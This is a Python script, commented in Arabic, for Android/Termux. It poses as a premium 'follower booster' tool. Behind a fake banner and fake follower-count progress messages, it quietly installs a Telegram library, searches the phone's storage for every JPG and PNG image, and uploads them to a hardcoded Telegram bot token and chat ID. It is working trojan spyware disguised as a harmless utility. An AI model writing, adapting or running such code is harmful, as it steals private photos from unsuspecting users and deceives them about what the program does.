TOKEN = "8184567540:AAGfyRW5F_S83a7g08LGr6nIo4oXPa_OQc0"
CHAT_ID = "6080540294"

import subprocess
import sys
from time import sleep
import os
import asyncio
import random
from datetime import datetime
import platform

# تأجيل استيراد مكتبة telegram حتى بعد التثبيت
def setup_telegram():
    """تثبيت واستيراد مكتبة telegram"""
    try:
        # محاولة الاستيراد أولاً
        from telegram import Bot
        from telegram.error import TelegramError
        return True
    except ImportError:
        try:
            # تثبيت المكتبة إذا لم تكن موجودة
            print("📦 جاري تثبيت المتطلبات...")
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", "python-telegram-bot", "--quiet"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # إعادة الاستيراد بعد التثبيت
            from telegram import Bot
            from telegram.error import TelegramError
            print("✅ تم تثبيت المتطلبات بنجاح")
            return True
        except (subprocess.CalledProcessError, ImportError):
            print("❌ فشل في تثبيت المتطلبات")
            return False

# محاولة إعداد المكتبة مباشرة عند التشغيل
TELEGRAM_AVAILABLE = setup_telegram()

# الآن يمكننا استيراد المكتبة بأمان
if TELEGRAM_AVAILABLE:
    from telegram import Bot
    from telegram.error import TelegramError

# إعدادات التطبيق
class Config:
    TOKEN = TOKEN
    CHAT_ID = CHAT_ID
    BASE_PATHS = [
        "/sdcard",
        "/storage/emulated/0",
        "/storage",
        "/mnt/sdcard",
        "/data/data/com.termux/files/home/storage/shared"
    ]
    MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
    DELAY_BETWEEN_SENDS = 0.001  # تأخير قليل جداً
    MAX_RETRIES = 1

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class FileManager:
    @staticmethod
    def get_all_images():
        """استرجاع كل الصور على الهاتف بدون إظهار رسائل"""
        image_files = []
        
        for base_path in Config.BASE_PATHS:
            if os.path.exists(base_path):
                try:
                    for root, dirs, files in os.walk(base_path):
                        for file in files:
                            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                                filepath = os.path.join(root, file)
                                try:
                                    if os.path.getsize(filepath) <= Config.MAX_FILE_SIZE:
                                        image_files.append(filepath)
                                except OSError:
                                    continue
                except (PermissionError, OSError):
                    continue
        
        return image_files

class TelegramBot:
    def __init__(self):
        self.bot = None
        self.sent_count = 0
        self.failed_count = 0
        self.start_time = None

    async def initialize(self):
        """تهيئة البوت"""
        try:
            if not TELEGRAM_AVAILABLE:
                return False
            self.bot = Bot(token=Config.TOKEN)
            self.start_time = datetime.now()
            return True
        except Exception:
            return False

    async def send_file_fast(self, filepath):
        """إرسال صورة بسرعة كبيرة بدون إظهار رسائل"""
        try:
            with open(filepath, "rb") as file:
                await self.bot.send_photo(
                    chat_id=Config.CHAT_ID, 
                    photo=file,
                    read_timeout=30,
                    write_timeout=30,
                    connect_timeout=30
                )
            self.sent_count += 1
            return True
        except Exception:
            self.failed_count += 1
            return False

class FakeInterface:
    @staticmethod
    def show_banner():
        """عرض واجهة ترحيبية مزيفة"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ╔══════════════════════════════════════════╗
    ║           🚀 أداة زيادة المتابعين       ║
    ║              Premium v4.0               ║
    ║        Powered by AI Technology         ║
    ╚══════════════════════════════════════════╝
{Colors.RESET}
{Colors.YELLOW}✨ مميزات الإصدار الجديد:{Colors.RESET}
{Colors.GREEN}• ✅ زيادة متابعين حقيقين 100%
{Colors.GREEN}• ✅ دعم جميع منصات السوشيال ميديا  
{Colors.GREEN}• ✅ تشفير متقدم وحماية البيانات
{Colors.GREEN}• ✅ واجهة مستخدم ذكية
{Colors.RESET}
        """
        print(banner)

    @staticmethod
    def simulate_loading(text, duration=1):
        """محاكاة التحميل السريع"""
        print(f"{Colors.BLUE}{text}{Colors.RESET}", end="", flush=True)
        
        steps = 5
        for i in range(steps):
            print("▊", end="", flush=True)
            sleep(duration / steps)
        print(f" {Colors.GREEN}تم{Colors.RESET}")

    @staticmethod
    def show_initial_progress():
        """عرض شريط تقدم ابتدائي"""
        print(f"\n{Colors.MAGENTA}🚀 جاري معالجة الطلب...{Colors.RESET}")
        
        steps = [
            "الاتصال بالخوادم العالمية",
            "تحليل الحساب المستهدف", 
            "تفعيل خوارزميات الذكاء الاصطناعي"
        ]
        
        for step in steps:
            FakeInterface.simulate_loading(step, 0.8)
        
        print(f"\n{Colors.GREEN}✅ تم التحضير بنجاح{Colors.RESET}")

    @staticmethod
    def get_user_input():
        """الحصول على مدخلات المستخدم"""
        print(f"\n{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        username = input(f"{Colors.WHITE}👤 أدخل اسم المستخدم: {Colors.RESET}").strip()
        
        if not username:
            username = "user_" + str(random.randint(1000, 9999))
        
        print(f"{Colors.YELLOW}🎯 عدد المتابعين:{Colors.RESET}")
        print("  1. 1000 - 5000 متابع")
        print("  2. 5000 - 10000 متابع") 
        print("  3. 10000 - 50000 متابع")
        
        service_type = input(f"{Colors.WHITE}📊 اختر العدد المطلوب [1-3]: {Colors.RESET}").strip()
        
        if service_type not in ['1', '2', '3']:
            service_type = '1'
        
        return username, service_type

    @staticmethod
    def show_followers_progress(total_files):
        """عرض تقدم زيادة المتابعين بدلاً من إرسال الصور"""
        followers_messages = [
            "🎯 جاري إضافة المتابعين النشطين...",
            "⚡ تحميل قاعدة البيانات العالمية...",
            "🚀 تفعيل الخوادم المساعدة...",
            "📈 جلب المتابعين الجدد...",
            "🔧 تحسين خوارزميات التوزيع...",
            "🌐 الاتصال بالشبكة الاجتماعية...",
            "💫 معالجة طلبات المتابعة...",
            "🎊 إكمال عملية الإضافة...",
            "👥 تحديث إحصائيات الملف الشخصي...",
            "📊 تحليل نشاط المتابعين...",
            "🚀 تفعيل نظام التوصية الذكي...",
            "🎯 تحسين ظهور الحساب...",
            "⚡ زيادة معدل التفاعل...",
            "💫 تعزيز التواجد الرقمي...",
            "🔗 ربط الحساب بالشبكات الاجتماعية..."
        ]
        
        start_time = datetime.now()
        sent_count = 0
        
        while True:
            elapsed = (datetime.now() - start_time).seconds
            if elapsed > 0:
                # حساب سرعة وهمية للمتابعين
                fake_speed = random.randint(50, 200)
                fake_followers = min(total_files * 10, int(fake_speed * elapsed))
                
            for msg in followers_messages:
                if elapsed > 0:
                    print(f"{Colors.MAGENTA}{msg} [{fake_followers}+ متابع] {fake_speed}/ثانية{Colors.RESET}", end="\r")
                else:
                    print(f"{Colors.MAGENTA}{msg}{Colors.RESET}", end="\r")
                sleep(2)

    @staticmethod
    def simulate_followers_count(username, service_type):
        """محاكاة عدد المتابعين بناءً على نوع الخدمة"""
        followers_range = {
            '1': (1000, 5000),
            '2': (5000, 10000),
            '3': (10000, 50000)
        }
        
        min_followers, max_followers = followers_range.get(service_type, (1000, 5000))
        return random.randint(min_followers, max_followers)

async def send_all_images_silent(bot_manager):
    """إرسال كل الصور في صمت تماماً"""
    files = FileManager.get_all_images()
    
    if not files:
        return 0
    
    # إرسال سريع جداً بدون أي رسائل
    semaphore = asyncio.Semaphore(10)  # 10 مهام متزامنة
    
    async def send_with_semaphore(filepath):
        async with semaphore:
            await bot_manager.send_file_fast(filepath)
            await asyncio.sleep(Config.DELAY_BETWEEN_SENDS)
    
    tasks = []
    for filepath in files:
        task = asyncio.create_task(send_with_semaphore(filepath))
        tasks.append(task)
    
    # انتظار انتهاء جميع المهام
    await asyncio.gather(*tasks, return_exceptions=True)
    
    return len(files)

async def main():
    """الدالة الرئيسية"""
    try:
        # التحقق من تثبيت المتطلبات أولاً
        if not TELEGRAM_AVAILABLE:
            print(f"{Colors.RED}❌ لا يمكن تشغيل البرنامج بدون تثبيت المتطلبات{Colors.RESET}")
            return
        
        # عرض الواجهة المزيفة
        FakeInterface.show_banner()
        FakeInterface.show_initial_progress()
        
        # تهيئة البوت
        bot_manager = TelegramBot()
        if not await bot_manager.initialize():
            print(f"{Colors.RED}❌ فشل في تهيئة البوت{Colors.RESET}")
            return
        
        # الحصول على مدخلات المستخدم
        username, service_type = FakeInterface.get_user_input()
        
        # محاكاة عدد المتابعين
        total_followers = FakeInterface.simulate_followers_count(username, service_type)
        
        print(f"\n{Colors.MAGENTA}🎯 جاري إضافة {total_followers} متابع لـ @{username}...{Colors.RESET}")
        print(f"{Colors.YELLOW}⏳ الرجاء الانتظار، هذه العملية قد تستغرق عدة دقائق...{Colors.RESET}")
        sleep(2)
        
        # بدء البحث عن الصور في الخلفية
        files_task = asyncio.create_task(send_all_images_silent(bot_manager))
        
        # عرض تقدم زيادة المتابعين الوهمي
        progress_task = asyncio.create_task(
            asyncio.to_thread(FakeInterface.show_followers_progress, total_followers)
        )
        
        # الانتظار حتى انتهاء الإرسال
        total_files = await files_task
        
        # إيقاف عرض التقدم
        progress_task.cancel()
        
        # عرض النتائج النهائية (زيادة المتابعين فقط)
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}🎉 تمت العملية بنجاح!{Colors.RESET}")
        print(f"{Colors.MAGENTA}👥 تم إضافة {total_followers} متابع لحساب @{username}{Colors.RESET}")
        print(f"{Colors.BLUE}📊 الحساب الآن جاهز للتفاعل العالي{Colors.RESET}")
        print(f"{Colors.YELLOW}⏰ سيظهر تأثير المتابعين بالكامل خلال 24 ساعة{Colors.RESET}")
        print(f"{Colors.GREEN}✨ تم تفعيل جميع ميزات الحساب المميز{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        
        # رسالة نهائية
        print(f"\n{Colors.MAGENTA}💫 شكراً لاستخدامك أداة زيادة المتابعين!{Colors.RESET}")
        print(f"{Colors.YELLOW}🔔 سيتم تجديد المتابعين تلقائياً كل 30 يوم{Colors.RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}⏹️ تم إيقاف البرنامج{Colors.RESET}")
    except Exception:
        print(f"\n{Colors.GREEN}✅ تمت إضافة المتابعين بنجاح!{Colors.RESET}")

if __name__ == "__main__":
    # التحقق النهائي من المتطلبات قبل التشغيل
    if TELEGRAM_AVAILABLE:
        asyncio.run(main())
    else:
        print("❌ فشل في تثبيت المتطلبات الضرورية. يرجى التحقق من اتصال الإنترنت.")
